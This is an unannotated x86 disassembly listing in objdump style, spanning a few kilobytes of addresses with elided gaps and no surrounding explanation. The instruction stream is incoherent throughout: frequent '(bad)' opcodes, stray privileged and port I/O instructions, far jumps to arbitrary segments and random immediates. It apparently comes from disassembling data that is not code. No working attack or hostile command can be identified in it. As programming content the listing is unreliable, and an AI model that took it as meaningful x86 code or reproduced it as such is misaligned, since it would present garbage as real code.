  427cea:	ins    DWORD PTR es:[edi],dx
  427ceb:	mov    esi,0xaa979ce2
  427cf0:	js     0x427caf
  427cf2:	add    BYTE PTR [edx+0x4e771b31],al
  427cf8:	out    dx,al
  427cf9:	sahf   
  427cfa:	rcr    ah,1
  427cfc:	sub    DWORD PTR [ebx+0x68d4f21f],ecx
  427d02:	das    
  427d03:	jbe    0x427d32
  427d05:	dec    edx
  427d06:	clc    
  427d07:	das    
  427d08:	xor    ebp,DWORD PTR ds:0xeceda7f7
  427d0e:	xor    eax,0x7f5616a5
  427d13:	test   BYTE PTR [ecx-0x4de55a41],ch
  427d19:	ds pop ds
  427d1b:	mov    bl,0x81
  427d1d:	lea    esi,[edx-0x63dccde1]
  427d23:	daa    
  427d24:	lock jb 0x427d55
  427d27:	lds    ecx,FWORD PTR [edx]
  427d29:	mov    esp,0xd482f08a
  427d2e:	jl     0x427d17
  427d30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d31:	pop    ebx
  427d32:	pop    edi
  427d33:	push   0xb9d5e150
  427d38:	sbb    BYTE PTR [edx+0x74bdd34a],bh
  427d3e:	and    al,0x1e
  427d40:	dec    eax
  427d41:	cmp    eax,0x60e9b433
  427d46:	sub    al,0xd0
  427d48:	std    
  427d49:	(bad)  
  427d4c:	cdq    
  427d4d:	aad    0xe7
  427d4f:	jnp    0x427d85
  427d51:	push   eax
  427d52:	and    edi,0x6d451277
  427d58:	dec    esi
  427d59:	mov    esp,0xbd9487c6
  427d5e:	mov    cl,0x1d
  427d60:	gs inc esp
  427d62:	(bad)  
  427d63:	out    dx,eax
  427d64:	or     ah,BYTE PTR [ecx-0x1b]
  427d67:	fistp  WORD PTR [esi-0x6246b20a]
  427d6d:	lods   al,BYTE PTR ds:[esi]
  427d6e:	pusha  
  427d6f:	push   edx
  427d70:	rcr    ch,cl
  427d72:	loopne 0x427d15
  427d74:	mov    al,ds:0xd1fdf367
  427d79:	stos   DWORD PTR es:[edi],eax
  427d7a:	jecxz  0x427dda
  427d7c:	xchg   esi,eax
  427d7d:	fidiv  WORD PTR [esi-0x71ccf5e7]
  427d83:	lods   al,BYTE PTR ds:[esi]
  427d84:	pop    eax
  427d85:	jbe    0x427db6
  427d87:	fistp  QWORD PTR [ebp+0x3cc27361]
  427d8d:	scas   eax,DWORD PTR es:[edi]
  427d8e:	mov    ecx,0xd4dc68cb
  427d93:	imul   eax,DWORD PTR [edi+0x5e],0xbf36dc38
  427d9a:	stc    
  427d9b:	cdq    
  427d9c:	xor    BYTE PTR ds:0xfa679939,ch
  427da2:	adc    BYTE PTR [edi+ebp*1+0x62],al
  427da6:	or     ebp,DWORD PTR [edx]
  427da8:	pop    ss
  427da9:	loopne 0x427dbb
  427dab:	mov    ds:0x86bbdad0,eax
  427db0:	push   ss
  427db1:	scas   eax,DWORD PTR es:[edi]
  427db2:	in     al,0xe3
  427db4:	mov    cl,0x0
	...
  427e16:	mov    eax,0x6d3c25f1
  427e1b:	cld    
  427e1c:	mov    ecx,0xf22c23f5
  427e21:	add    BYTE PTR [edi-0x3fff8620],ah
  427e27:	test   eax,0x1070001
  427e2c:	add    BYTE PTR [eax],al
  427e2e:	push   ds
  427e2f:	in     eax,0xe8
  427e31:	jbe    0x427e98
  427e33:	pop    edi
  427e34:	es sub al,0x10
  427e37:	data16 xlat BYTE PTR ds:[ebx]
  427e39:	xor    bh,dh
  427e3b:	mov    edi,0xca903c2b
  427e40:	cli    
  427e41:	dec    edx
  427e42:	fwait
  427e43:	jo     0x427e8a
  427e45:	xor    bl,BYTE PTR [edx]
  427e47:	or     al,0xc6
  427e49:	pop    es
  427e4a:	mov    dl,0x36
  427e4c:	or     DWORD PTR [esi-0x21e7b71b],ebx
  427e52:	push   ebp
  427e53:	rcl    DWORD PTR [eax],1
  427e55:	pop    es
  427e56:	push   esp
  427e57:	push   cs
  427e58:	push   0xf9260755
  427e5d:	jb     0x427e5f
  427e5f:	xchg   esi,ebx
  427e61:	sbb    al,0x4d
  427e63:	ins    BYTE PTR es:[edi],dx
  427e64:	sub    al,BYTE PTR [ecx-0x40]
  427e67:	(bad)  
  427e68:	fdiv   QWORD PTR [edi-0x55398465]
  427e6e:	push   0x814a1d17
  427e73:	test   DWORD PTR [esi],ecx
  427e75:	dec    esp
  427e76:	call   0x5222af9c
  427e7b:	mov    bh,0x69
  427e7d:	call   0xf61c96a1
  427e82:	mov    esp,0x3f5f560d
  427e87:	rcl    eax,1
  427e89:	mov    ds:0x626903e2,eax
  427e8e:	aam    0xe0
  427e90:	mov    bh,0x47
  427e92:	cmc    
  427e93:	daa    
  427e94:	and    eax,0x99af3470
  427e99:	cs cmp al,0xfd
  427e9c:	inc    esp
  427e9d:	outs   dx,BYTE PTR ds:[esi]
  427e9e:	rcr    edx,cl
  427ea0:	out    0xdd,eax
  427ea2:	lods   al,BYTE PTR ds:[esi]
  427ea3:	cmp    al,BYTE PTR [eax]
  427ea5:	xchg   ebp,eax
  427ea6:	jnp    0x427e39
  427ea8:	lahf   
  427ea9:	mov    ecx,0x169a8d41
  427eae:	push   ebp
  427eaf:	mov    esp,0x9857b4c6
  427eb4:	xchg   ebp,eax
  427eb5:	or     bl,BYTE PTR [edx-0x70]
  427eb8:	jb     0x427e6f
  427eba:	mov    ebp,0xc2ee180f
  427ebf:	jmp    0x587f623a
  427ec4:	int3   
  427ec5:	out    0x84,eax
  427ec7:	cmp    ebp,DWORD PTR [eax-0x64eca1d1]
  427ecd:	jmp    0x427e9c
  427ecf:	test   BYTE PTR [eax-0x6225d0c3],ah
  427ed5:	xor    eax,0x452eabe6
  427eda:	inc    ecx
  427edb:	out    0x5,al
  427edd:	in     al,0x30
  427edf:	dec    ebx
  427ee0:	sbb    dh,al
  427ee2:	add    BYTE PTR ds:0xb1d27f34,ch
  427ee8:	not    BYTE PTR [ebp-0x36]
  427eeb:	jbe    0x427e93
  427eed:	pop    es
  427eee:	cmp    ecx,esi
  427ef0:	pop    es
  427ef1:	(bad)  
  427ef2:	jmp    0xcb06:0x23c4cb8e
  427ef9:	mov    ds:0x1ccac3a3,eax
  427efe:	dec    ecx
  427eff:	inc    edi
  427f00:	ret    
  427f01:	dec    ebx
  427f02:	fdiv   QWORD PTR [eax+edi*1+0x3006b286]
  427f09:	mov    BYTE PTR [ecx+0x11],bh
  427f0c:	mov    eax,ss:0x50b05fd6
  427f12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f13:	cmp    DWORD PTR [edx],ebp
  427f15:	fwait
  427f16:	dec    ecx
  427f17:	(bad)  [edi+0xbc7674d]
  427f1d:	in     eax,0xe4
  427f1f:	xchg   esp,eax
  427f20:	jle    0x427f07
  427f22:	(bad)  
  427f23:	es test al,dl
  427f26:	add    al,0xbf
  427f28:	add    al,0x2e
  427f2a:	(bad)  
  427f2b:	std    
  427f2c:	ror    DWORD PTR [edx+0x5a723de2],cl
  427f32:	or     DWORD PTR [ebx+0xbe],0x0
	...
  427f95:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  427f9b:	out    dx,eax
  427f9c:	cmc    
  427f9d:	mov    edi,0x85e029ac
  427fa2:	popa   
  427fa3:	nop
  427fa4:	pop    ebx
  427fa5:	mov    edx,0x1aac7
  427faa:	pop    es
  427fab:	add    DWORD PTR [eax],eax
  427fad:	add    BYTE PTR [edx+0x4],dl
  427fb0:	adc    bl,BYTE PTR [ebp-0x6eab5827]
  427fb6:	mov    al,ds:0xb3b9b9c8
  427fbb:	xor    al,0xf0
  427fbd:	xor    cl,BYTE PTR [ebx]
  427fbf:	in     eax,dx
  427fc0:	pop    esi
  427fc1:	ror    BYTE PTR [esi-0xea8ec76],0x67
  427fc8:	xchg   edi,eax
  427fc9:	fs inc ebx
  427fcb:	and    esp,ecx
  427fcd:	shr    BYTE PTR [esi+0x3b],cl
  427fd0:	and    dh,0xec
  427fd3:	cwde   
  427fd4:	dec    ecx
  427fd5:	cmp    eax,0xfcd87e1b
  427fda:	shl    BYTE PTR ds:0x684c1202,1
  427fe0:	jno    0x427fc6
  427fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427fe3:	in     eax,0xcc
  427fe5:	arpl   WORD PTR [esi-0x3d370af0],cx
  427feb:	mov    dh,al
  427fed:	xor    BYTE PTR [eax+ecx*1],0xc0
  427ff1:	gs call 0xc06dbc25
  427ff7:	xchg   ebx,eax
  427ff8:	aam    0x19
  427ffa:	inc    eax
  427ffb:	loop   0x427ffd
  427ffd:	pop    ds
  427ffe:	mov    cl,0x16
  428000:	jle    0x427f9d
  428002:	push   ecx
  428003:	jge    0x42802f
  428005:	cmp    DWORD PTR [eax-0x12],eax
  428008:	das    
  428009:	mov    ds:0x66c9f359,al
  42800e:	ja     0x42801b
  428010:	(bad)  
  428011:	add    DWORD PTR [si-0x7ecf],0x5
  428017:	std    
  428018:	leave  
  428019:	in     al,0x28
  42801b:	mov    edi,0x14f8a4a5
  428020:	inc    ebx
  428021:	neg    BYTE PTR [ebp-0x42]
  428024:	adc    al,0x6b
  428026:	test   eax,0x36fa3a84
  42802b:	cmp    dl,BYTE PTR [eax+0x7cd38004]
  428031:	jmp    0x2e354801
  428036:	and    bh,BYTE PTR [ecx+0xc]
  428039:	jnp    0x428019
  42803b:	dec    esp
  42803c:	stos   BYTE PTR es:[edi],al
  42803d:	in     al,0xef
  42803f:	test   eax,0x9d66e117
  428044:	ins    DWORD PTR es:[edi],dx
  428045:	and    ch,BYTE PTR [edx-0x33]
  428048:	arpl   WORD PTR [ecx+0xf],bp
  42804b:	sbb    al,0xa2
  42804d:	lods   eax,DWORD PTR ds:[esi]
  42804e:	mov    edx,0x6577fa43
  428053:	stos   BYTE PTR es:[edi],al
  428054:	jnp    0x428085
  428056:	jb     0x428007
  428058:	out    dx,eax
  428059:	jbe    0x42803c
  42805b:	fistp  DWORD PTR [edi-0x67]
  42805e:	xor    al,0x48
  428060:	mov    edi,0xa5454441
  428065:	mov    dh,0x8f
  428067:	pop    eax
  428068:	cmp    dl,0xec
  42806b:	xchg   esp,eax
  42806c:	xor    al,0x8d
  42806e:	test   eax,0xb1948834
  428073:	mov    ds:0x7818334,al
  428078:	clc    
  428079:	cmp    eax,0x85fbf443
  42807e:	sub    BYTE PTR [ebx+0x3a1dfced],bl
  428084:	bound  edi,QWORD PTR [eax-0x9d1d278]
  42808a:	(bad)  
  42808b:	stc    
  42808c:	sbb    ah,BYTE PTR [esi]
  42808e:	and    ebx,edi
  428090:	push   ss
  428091:	ficomp DWORD PTR [edi+esi*4]
  428094:	int    0xb4
  428096:	mov    al,ds:0xe82ae04e
  42809b:	xor    al,0x29
  42809d:	scas   eax,DWORD PTR es:[edi]
  42809e:	(bad)  
  42809f:	(bad)  
  4280a1:	push   cs
  4280a2:	stc    
  4280a3:	mov    bl,0x40
  4280a5:	pushf  
  4280a6:	outs   dx,BYTE PTR cs:[esi]
  4280a8:	add    DWORD PTR [esi+0x73d38677],0x35c7898d
  4280b2:	jmp    0x436b8d
	...
  428113:	add    BYTE PTR [eax],al
  428115:	add    bh,bl
  428117:	out    dx,al
  428118:	std    
  428119:	dec    esp
  42811a:	std    
  42811b:	pop    edi
  42811c:	(bad)  
  42811d:	(bad)  
  42811e:	cmp    al,0x36
  428120:	cmp    esp,ebp
  428122:	sbb    ah,ah
  428124:	inc    eax
  428125:	scas   eax,DWORD PTR es:[edi]
  428126:	into   
  428127:	stos   DWORD PTR es:[edi],eax
  428128:	add    DWORD PTR [eax],eax
  42812a:	pop    es
  42812b:	add    DWORD PTR [eax],eax
  42812d:	add    BYTE PTR [ecx],ch
  42812f:	popa   
  428130:	lahf   
  428131:	es xchg edi,eax
  428133:	pop    es
  428134:	jg     0x42810e
  428136:	or     eax,0x36e3ab80
  42813b:	sub    ebx,edx
  42813d:	nop
  42813e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42813f:	mov    edi,0x1f75c053
  428145:	mov    dl,0xde
  428147:	and    DWORD PTR [edx+0xd],esi
  42814a:	jl     0x4281ad
  42814c:	or     dh,cl
  42814e:	out    0xb4,al
  428150:	lock pop ebp
  428152:	jo     0x428184
  428154:	mov    edx,esp
  428156:	inc    ebp
  428157:	xlat   BYTE PTR ds:[ebx]
  428158:	lods   eax,DWORD PTR ds:[esi]
  42815a:	mov    edi,edx
  42815c:	mov    esi,0xc7a8fa17
  428161:	pop    ebp
  428162:	sub    bh,BYTE PTR [ebp+0x6f359251]
  428168:	cs mov dl,ah
  42816b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42816c:	dec    edx
  42816d:	fild   WORD PTR [esi+0x33]
  428170:	or     eax,0x14ee22ae
  428175:	inc    edx
  428176:	out    dx,eax
  428177:	xor    DWORD PTR [eax+eiz*1],ecx
  42817a:	in     al,dx
  42817b:	add    DWORD PTR [esi+0x431f51cb],esi
  428181:	pushf  
  428182:	dec    esi
  428183:	push   ebp
  428184:	pop    esp
  428185:	and    esp,DWORD PTR [eax-0x6f6a579b]
  42818b:	push   0x6e81b995
  428190:	add    ecx,DWORD PTR [edi]
  428192:	aad    0xba
  428194:	inc    eax
  428195:	pop    esi
  428196:	nop
  428197:	push   di
  428199:	inc    ebp
  42819a:	inc    edi
  42819b:	add    dl,BYTE PTR [ecx+0x3d3c3a54]
  4281a1:	ret    
  4281a2:	in     eax,dx
  4281a3:	dec    edx
  4281a4:	inc    ebp
  4281a5:	cmp    BYTE PTR [edx],al
  4281a7:	(bad)  
  4281a8:	shl    DWORD PTR [edi+0x68],1
  4281ab:	aam    0x83
  4281ad:	lock push eax
  4281af:	jno    0x428144
  4281b1:	and    bh,al
  4281b3:	repz mov ebx,0xda4e4735
  4281b9:	mov    edi,0xcf753311
  4281be:	jmp    0x43bd:0x6b4bc9a2
  4281c5:	jb     0x428147
  4281c7:	les    esi,FWORD PTR gs:[ecx-0x5ca02bba]
  4281ce:	adc    al,0x9f
  4281d0:	adc    bl,BYTE PTR [edi]
  4281d2:	fisub  DWORD PTR [ebp-0x71]
  4281d5:	neg    DWORD PTR gs:[ebx-0x6]
  4281d9:	pop    ss
  4281da:	(bad)  
  4281db:	(bad)  [eax-0x13]
  4281de:	push   ds
  4281df:	scas   eax,DWORD PTR es:[edi]
  4281e0:	cwde   
  4281e1:	shl    BYTE PTR [ebx-0x2d1f8318],cl
  4281e7:	fwait
  4281e8:	or     eax,esp
  4281ea:	(bad)  
  4281eb:	xor    al,0x1b
  4281ed:	ds mov ecx,0x9bf5de7a
  4281f3:	ror    edx,0x9f
  4281f6:	test   DWORD PTR [eax],ebp
  4281f8:	sbb    BYTE PTR [eax-0x5],0x79
  4281fc:	mov    edx,0x6bcfaedb
  428201:	in     eax,dx
  428202:	adc    eax,0x59f0cd25
  428207:	sub    al,0x5c
  428209:	(bad)  
  42820a:	js     0x42824d
  42820c:	clts   
  42820e:	aad    0x33
  428210:	loopne 0x42820f
  428212:	gs ins DWORD PTR es:[edi],dx
  428214:	jl     0x428202
  428216:	fidivr DWORD PTR ss:[edi+0x27974dec]
  42821d:	in     eax,0x93
  42821f:	sub    al,0x8e
  428221:	fcomp  DWORD PTR [edi+0x6ff94f7c]
  428227:	mov    ecx,0x10ef502c
  42822c:	fidiv  DWORD PTR [eax]
  42822e:	retf   
  42822f:	mov    dl,0xa1
  428231:	out    0x7d,eax
  428233:	out    0x2c,eax
	...
  428295:	add    bh,al
  428297:	fidiv  WORD PTR [esi]
  428299:	loop   0x4282da
  42829b:	jmp    0x52eb:0x1ad8ffd7
  4282a2:	pop    eax
  4282a3:	scas   al,BYTE PTR es:[edi]
  4282a4:	jae    0x428233
  4282a6:	aad    0xac
  4282a8:	add    DWORD PTR [eax],eax
  4282aa:	pop    es
  4282ab:	add    DWORD PTR [eax],eax
  4282ad:	add    BYTE PTR [eax+0x1c],dh
  4282b0:	cmp    dh,dl
  4282b2:	mov    cl,0x2
  4282b4:	pop    esi
  4282b5:	dec    ecx
  4282b6:	pop    esp
  4282b7:	mov    ecx,0xf236bcaf
  4282bc:	mov    BYTE PTR [ecx-0x4aa5d8b7],0x9
  4282c3:	loopne 0x428245
  4282c5:	lea    ecx,[ecx]
  4282c7:	jbe    0x428251
  4282c9:	sbb    edi,DWORD PTR [edx]
  4282cb:	sbb    BYTE PTR [ecx-0x1f9f96e9],al
  4282d1:	or     al,0xd5
  4282d3:	or     cl,BYTE PTR [ebx+0x20cd1cc2]
  4282d9:	mov    bh,0x3e
  4282db:	(bad)  
  4282dc:	imul   ecx,DWORD PTR [eax],0x6d2ce374
  4282e2:	sub    al,BYTE PTR [eax+0x76]
  4282e5:	nop
  4282e6:	(bad)  
  4282e7:	loop   0x428320
  4282e9:	jmp    0xb2b1fbc9
  4282ee:	ss jbe 0x42829a
  4282f1:	cmc    
  4282f2:	lea    ebx,[edx+eiz*2+0x757d918d]
  4282f9:	repz or DWORD PTR [edx+ecx*4-0x23],ebp
  4282fe:	cmp    ch,dl
  428300:	pop    ds
  428301:	hlt    
  428302:	pop    ds
  428303:	pop    ebp
  428304:	jp     0x4282bf
  428306:	and    al,0xaf
  428309:	je     0x428291
  42830b:	call   0xc1247a99
  428310:	xchg   ebx,eax
  428311:	mov    al,0x66
  428313:	push   ebp
  428314:	out    0x83,eax
  428316:	aad    0x4f
  428318:	cmp    eax,0x1f3fc5a8
  42831d:	mov    dh,0x45
  42831f:	lea    esp,[esi-0x677d3fff]
  428325:	test   eax,0xc83e3af0
  42832a:	jecxz  0x428311
  42832c:	call   0x3c62:0xf6cb45bb
  428333:	in     eax,dx
  428334:	add    edi,DWORD PTR [ecx-0x4b]
  428337:	push   edi
  428338:	dec    edi
  428339:	das    
  42833a:	mov    edi,0x37111d18
  42833f:	div    DWORD PTR [eax-0x7bde1e5]
  428345:	int    0x78
  428347:	addr16 push esi
  428349:	push   ds
  42834a:	jl     0x4283ca
  42834c:	arpl   WORD PTR [esi],bx
  42834e:	iret   
  42834f:	dec    eax
  428350:	push   ebp
  428351:	add    eax,0xb5216e65
  428356:	adc    BYTE PTR [edx],cl
  428358:	(bad)  
  428359:	rsm    
  42835b:	(bad)  
  42835c:	repz cmp al,0x5e
  42835f:	jecxz  0x42835b
  428361:	cdq    
  428362:	or     eax,0x74262918
  428367:	pop    ss
  428368:	jmp    0x2f9e03ba
  42836d:	mov    WORD PTR [esi+0x5d],ds
  428370:	imul   ebx,DWORD PTR [esi],0xec06f5b7
  428376:	popf   
  428377:	push   ebp
  428378:	das    
  428379:	xchg   al,al
  42837b:	sbb    eax,0xbfc9670b
  428380:	dec    ebx
  428381:	and    esi,DWORD PTR [eax]
  428383:	sub    edx,DWORD PTR [ebp-0x742fa3e7]
  428389:	mov    ch,0x51
  42838b:	ja     0x4283ef
  42838d:	lea    edx,[edx]
  42838f:	in     eax,dx
  428390:	mov    BYTE PTR [esi+edi*2-0x31],ch
  428394:	or     al,0x94
  428396:	dec    esi
  428397:	mov    bl,0xcb
  428399:	push   edi
  42839a:	sar    BYTE PTR [esi-0x34c63d8],1
  4283a0:	mov    bh,ch
  4283a2:	retf   0x8703
  4283a5:	cmp    esi,DWORD PTR [edx-0x67]
  4283a8:	stos   DWORD PTR es:[edi],eax
  4283a9:	sar    DWORD PTR [eax+0x2b],cl
  4283ac:	daa    
  4283ad:	lock aaa 
  4283af:	sar    BYTE PTR [esi+0x7f],cl
  4283b2:	fisttp QWORD PTR [ecx]
  4283b4:	out    0x0,eax
	...
  428416:	push   cs
  428417:	xchg   esp,eax
  428418:	jg     0x42847d
  42841a:	(bad)  
  42841b:	jmp    0x42843b
  42841d:	std    
  42841e:	push   ebx
  42841f:	int    0x1
  428421:	(bad)  
  428422:	cwde   
  428423:	lahf   
  428424:	sub    esp,eax
  428426:	fsubr  QWORD PTR [ebp+0x1070001]
  42842c:	add    BYTE PTR [eax],al
  42842e:	int    0xbe
  428430:	je     0x428416
  428432:	fwait
  428433:	pusha  
  428434:	stos   BYTE PTR es:[edi],al
  428435:	sar    bh,1
  428437:	cwde   
  428438:	sub    DWORD PTR [eax+0x6f],ecx
  42843b:	les    esp,FWORD PTR fs:[esi]
  42843e:	aas    
  42843f:	ds ret 0xa5ec
  428443:	ss mov ah,0xb9
  428446:	cmp    ch,al
  428448:	loope  0x428447
  42844a:	sub    eax,0xb324ce97
  42844f:	cmp    edi,DWORD PTR [edi-0x1a528b99]
  428455:	js     0x4284ab
  428457:	and    BYTE PTR [ebx-0x43],dl
  42845a:	rcl    BYTE PTR [edx-0x612e9396],1
  428460:	cdq    
  428461:	dec    esi
  428462:	adc    dl,BYTE PTR [ebx+0x4e17d7ed]
  428468:	pop    esi
  428469:	xlat   BYTE PTR ds:[ebx]
  42846a:	mov    bh,BYTE PTR [edi+eax*2]
  42846d:	inc    esi
  42846e:	and    eax,0x90fc030a
  428473:	inc    esi
  428474:	scas   al,BYTE PTR es:[edi]
  428475:	sub    eax,0xb533b10d
  42847a:	push   ss
  42847b:	icebp  
  42847c:	jne    0x4284e2
  42847e:	fimul  WORD PTR [ebx+0x4a]
  428481:	or     DWORD PTR [ecx-0x63],0xe86be9ee
  428488:	ret    0xaece
  42848b:	sub    al,0x7b
  42848d:	clc    
  42848e:	xor    BYTE PTR [esi],ah
  428490:	xlat   BYTE PTR ds:[ebx]
  428491:	mov    ah,0xf5
  428493:	inc    edi
  428494:	mov    bl,0x17
  428496:	mov    ds:0x5a0f2ba0,eax
  42849b:	retf   0xc057
  42849e:	das    
  42849f:	mov    fs,WORD PTR [edx]
  4284a1:	jl     0x428461
  4284a3:	rcl    edx,1
  4284a5:	es pop edx
  4284a7:	in     eax,0xf4
  4284a9:	adc    BYTE PTR [edi-0x4d],al
  4284ac:	dec    esp
  4284ad:	ror    BYTE PTR [ebp+0x48],cl
  4284b0:	cmp    ebp,ebx
  4284b2:	repnz clc 
  4284b4:	add    esp,DWORD PTR [ecx]
  4284b6:	cli    
  4284b7:	(bad)  
  4284b8:	stos   BYTE PTR es:[edi],al
  4284b9:	sub    eax,0xa77bfc51
  4284be:	mov    bl,0x53
  4284c0:	call   0xf8372a89
  4284c5:	(bad)  
  4284c6:	mov    ebp,0x527ba303
  4284cb:	les    edx,FWORD PTR [eax+0x4c]
  4284ce:	push   ebx
  4284cf:	or     dh,BYTE PTR [ebx]
  4284d1:	sub    al,0x5c
  4284d3:	xchg   ecx,eax
  4284d4:	jmp    0x4284cb
  4284d6:	test   al,0x85
  4284d8:	mov    cl,0xd7
  4284da:	dec    ebp
  4284db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4284dc:	mov    esp,0xec8fcb6d
  4284e1:	in     al,dx
  4284e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284e3:	(bad)  
  4284e4:	es call 0x3328309b
  4284ea:	jnp    0x42851d
  4284ec:	mov    ch,0x63
  4284ee:	call   0xbc9b:0x2028fc92
  4284f5:	push   esp
  4284f6:	clc    
  4284f7:	inc    edx
  4284f8:	pop    ds
  4284f9:	cmp    DWORD PTR [ebp+0x75],ebp
  4284fc:	hlt    
  4284fd:	xor    BYTE PTR [eax+0x47],cl
  428500:	cmp    eax,0x8c1be652
  428505:	push   edi
  428506:	dec    eax
  428507:	call   FWORD PTR [ebx]
  428509:	out    dx,al
  42850a:	loope  0x428549
  42850c:	sti    
  42850d:	in     eax,0xeb
  42850f:	or     DWORD PTR [ecx],edi
  428511:	xchg   edx,eax
  428512:	out    dx,eax
  428513:	jmp    0x606bf7df
  428518:	jno    0x4284f2
  42851a:	clc    
  42851b:	mov    dh,0xf0
  42851d:	addr16 pop ss
  42851f:	add    BYTE PTR ds:0x1df5405b,dl
  428525:	mov    DWORD PTR [eax],eax
  428527:	add    BYTE PTR [edx-0x1d],ch
  42852a:	out    dx,eax
  42852b:	fisub  DWORD PTR [eax]
  42852d:	fsubr  QWORD PTR [edx]
  42852f:	daa    
  428530:	sbb    al,0x7b
  428532:	xchg   ebp,eax
  428533:	xchg   ebp,eax
  428534:	or     DWORD PTR [eax],eax
	...
  428596:	push   ecx
  428597:	div    BYTE PTR ds:0x5bffb73e
  42859d:	dec    ebp
  42859f:	sar    BYTE PTR [ecx-0x50],cl
  4285a2:	or     ebp,DWORD PTR [eax]
  4285a4:	lea    eax,[ebx+eiz*8+0x70001ae]
  4285ab:	add    DWORD PTR [eax],eax
  4285ad:	add    BYTE PTR [ebp-0x7a2bccdb],bh
  4285b3:	xchg   ebx,eax
  4285b4:	sbb    eax,0x54b92683
  4285b9:	add    eax,0x1971906b
  4285be:	add    BYTE PTR [ebp+esi*4+0xe],cl
  4285c2:	add    DWORD PTR [esp+eiz*2],ecx
  4285c5:	adc    DWORD PTR [esp+edi*8-0x3d],ebx
  4285c9:	stos   BYTE PTR es:[edi],al
  4285ca:	imul   ecx,DWORD PTR [ecx+0xb],0xffffff88
  4285ce:	push   eax
  4285cf:	jg     0x428639
  4285d1:	and    DWORD PTR es:[ebp+0x762c9e9],ebp
  4285d8:	repnz loop 0x42861d
  4285db:	jnp    0x428602
  4285dd:	ins    BYTE PTR es:[edi],dx
  4285de:	rcr    BYTE PTR [ebp-0x616f5ca1],0x94
  4285e5:	push   edx
  4285e6:	shl    BYTE PTR [esi+ecx*4],1
  4285e9:	add    DWORD PTR [edi-0x51],eax
  4285ec:	add    esp,esp
  4285ee:	cld    
  4285ef:	push   edi
  4285f0:	dec    ebp
  4285f1:	je     0x4285bb
  4285f3:	ds push ebp
  4285f5:	pop    ds
  4285f6:	imul   eax,DWORD PTR [edi],0x5c170bba
  4285fc:	test   BYTE PTR [ebx+0x68313db4],dl
  428602:	dec    ebx
  428603:	js     0x4285f9
  428605:	add    al,0x10
  428607:	ret    
  428608:	out    dx,eax
  428609:	sub    ecx,eax
  42860b:	call   0x44dc5548
  428610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428611:	ins    DWORD PTR es:[edi],dx
  428612:	xor    eax,0x1a0d6f2d
  428617:	aaa    
  428618:	jb     0x428638
  42861a:	cdq    
  42861b:	push   ds
  42861c:	retf   0x1827
  42861f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428620:	xchg   esp,eax
  428621:	mov    WORD PTR [eax+0x1f],ss
  428624:	mov    ds:0xe3919d7e,al
  428629:	cmp    eax,DWORD PTR ds:0x3b9ac8ec
  42862f:	sub    ebx,DWORD PTR [eax+0x1208c77b]
  428635:	stos   BYTE PTR es:[edi],al
  428636:	mov    bh,0x47
  428638:	js     0x428604
  42863a:	pop    es
  42863b:	shl    DWORD PTR [ecx+edi*8-0x2df870bc],1
  428642:	and    ebx,DWORD PTR [ebx-0x760fb920]
  428648:	and    DWORD PTR [edx+0x7a4deabd],ecx
  42864e:	mov    ch,BYTE PTR ds:0x4f43d01e
  428654:	xor    eax,DWORD PTR [ecx+edi*2]
  428657:	xchg   esp,eax
  428658:	ficomp DWORD PTR [ebp+0x1c]
  42865b:	mov    dl,0x98
  42865d:	int3   
  42865e:	pop    ecx
  42865f:	sub    eax,0x5d7157ee
  428664:	outs   dx,DWORD PTR ds:[esi]
  428665:	sbb    eax,0xda1bc048
  42866a:	rcr    DWORD PTR [edi+0x4f],cl
  42866d:	adc    al,0x23
  42866f:	mov    ah,0x6e
  428671:	sar    DWORD PTR [edi+0x61],1
  428674:	test   BYTE PTR [ecx+0x4b],cl
  428677:	or     esp,DWORD PTR [edi]
  428679:	dec    esi
  42867a:	sub    BYTE PTR [eax],ch
  42867c:	mov    ecx,0x64d84d6d
  428681:	out    dx,al
  428682:	push   ds
  428683:	dec    esi
  428684:	push   edi
  428685:	push   edi
  428686:	nop
  428687:	push   esi
  428688:	push   esi
  428689:	mov    al,0x8c
  42868b:	(bad)  
  42868c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42868d:	leave  
  42868e:	sub    al,BYTE PTR [ebx-0x75363582]
  428694:	xchg   ebx,eax
  428695:	adc    esp,edx
  428697:	nop
  428698:	out    0x36,al
  42869a:	and    BYTE PTR cs:[esi-0x2dbc3c5],0x31
  4286a2:	cs jno 0x4286ae
  4286a5:	and    al,0x57
  4286a7:	dec    eax
  4286a8:	mov    esp,0xa166f325
  4286ad:	xor    BYTE PTR [edx+edx*4-0x3903494],cl
  4286b4:	outs   dx,BYTE PTR ds:[esi]
	...
  428715:	add    BYTE PTR [esi+0x5b],dl
  428718:	xor    al,0x78
  42871a:	cmp    eax,0x967f5e7f
  42871f:	or     bh,BYTE PTR ss:[ecx-0x5d8dfcdc]
  428726:	jmp    0x1:0x70001af
  42872d:	add    BYTE PTR [esi+0x4b],bl
  428730:	push   edi
  428731:	push   cs
  428732:	pop    esp
  428733:	stos   BYTE PTR es:[edi],al
  428734:	scas   eax,DWORD PTR es:[edi]
  428735:	push   ebp
  428736:	leave  
  428737:	fs out dx,al
  428739:	jp     0x2ff8ccea
  42873f:	dec    eax
  428740:	or     esp,DWORD PTR [ebp-0x62]
  428743:	out    0xcf,al
  428745:	mov    esp,0x4723e626
  42874a:	and    DWORD PTR [ecx],edi
  42874c:	js     0x4286de
  42874e:	sbb    bh,BYTE PTR [eax-0x775953c]
  428754:	aam    0x8c
  428756:	in     eax,0xf8
  428758:	fistp  WORD PTR [ecx]
  42875a:	jae    0x428783
  42875c:	jle    0x4287b5
  42875e:	pop    eax
  42875f:	mul    BYTE PTR [ebp-0x7f96605f]
  428765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428766:	call   0x231d83ed
  42876b:	fiadd  DWORD PTR [ebx]
  42876d:	out    dx,al
  42876e:	loopne 0x42872f
  428770:	(bad)  
  428771:	jmp    0xba67:0x61bddb2e
  428778:	jb     0x4287d5
  42877a:	and    DWORD PTR [ebx-0x4cc389c9],edi
  428780:	cdq    
